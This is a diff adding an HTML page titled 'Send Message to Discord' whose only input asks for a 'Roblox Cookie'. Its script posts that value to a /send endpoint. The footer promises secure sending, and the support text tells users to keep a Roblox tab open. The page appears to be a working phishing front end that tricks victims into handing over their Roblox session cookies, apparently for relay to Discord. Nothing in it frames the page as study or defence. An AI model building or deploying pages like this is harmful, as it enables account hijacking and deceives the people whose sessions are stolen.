@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Send Message to Discord</title>
+  <style>
+    body {
+      background-color: #2c2f38;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
+    }
+
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 5vw;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      backdrop-filter: blur(10px);
+      box-sizing: border-box;
+    }
+
+    h1 {
+      margin-bottom: 5vw;
+      font-size: 6vw;
+      font-weight: bold;
+    }
+
+    input[type="text"] {
+      width: 80%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-bottom: 5vw;
+      font-size: 4vw;
+      outline: none;
+      background-color: #3a3f47;
+      color: #fff;
+      box-sizing: border-box;
+    }
+
+    button {
+      background: #ff5e5e;
+      border: none;
+      color: white;
+      padding: 12px;
+      font-size: 4.5vw;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      width: 100%;
+      margin-bottom: 4vw;
+    }
+
+    button:hover {
+      background: #e55a5a;
+    }
+
+    .support-button {
+      background: #56c1ff;
+    }
+
+    .support-button:hover {
+      background: #3aa1c2;
+    }
+
+    .footer {
+      font-size: 3vw;
+      opacity: 0.8;
+      margin-top: 4vw;
+    }
+
+    .support-section {
+      display: none;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 5vw;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+      margin-top: 5vw;
+      width: 100%;
+      box-sizing: border-box;
+      text-align: left;
+    }
+
+    .support-textarea {
+      width: 100%;
+      min-height: 120px;
+      padding: 12px;
+      border-radius: 8px;
+      background-color: #3a3f47;
+      color: white;
+      font-size: 4vw;
+      resize: none;
+      border: none;
+      box-sizing: border-box;
+    }
+
+    .close-support-button {
+      background: #ff5e5e;
+      margin-top: 4vw;
+    }
+
+    .close-support-button:hover {
+      background: #e55a5a;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Send Message to Discord</h1>
+    <input type="text" id="messageInput" placeholder="Enter Roblox Cookie">
+    <button onclick="sendMessage()">Send Message</button>
+
+    <button class="support-button" onclick="toggleSupportSection()">Support</button>
+
+    <div class="support-section" id="supportSection">
+      <h2>Support Information</h2>
+      <textarea class="support-textarea" id="supportText">
+Hey! If it's not working, our API is down and will be back up shortly.
+Make sure you have a Roblox tab open when you use it.
+      </textarea>
+      <button class="close-support-button" onclick="toggleSupportSection()">Close Support</button>
+    </div>
+
+    <div class="footer">Your message will be sent securely</div>
+  </div>
+
+  <script>
+    function sendMessage() {
+      const message = document.getElementById('messageInput').value.trim();
+      if (!message) {
+        alert('❗ Please enter a message.');
+        return;
+      }
+
+      fetch('/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: message })
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          alert('✅ Message sent!');
+          document.getElementById('messageInput').value = '';
+        } else {
+          alert('❌ Error: ' + data.error);
+        }
+      })
+      .catch(err => {
+        console.error(err);
+        alert('❌ Error sending message.');
+      });
+    }
+
+    function toggleSupportSection() {
+      const supportSection = document.getElementById('supportSection');
+      supportSection.style.display = (supportSection.style.display === 'block') ? 'none' : 'block';
+    }
+  </script>
+</body>
+</html>
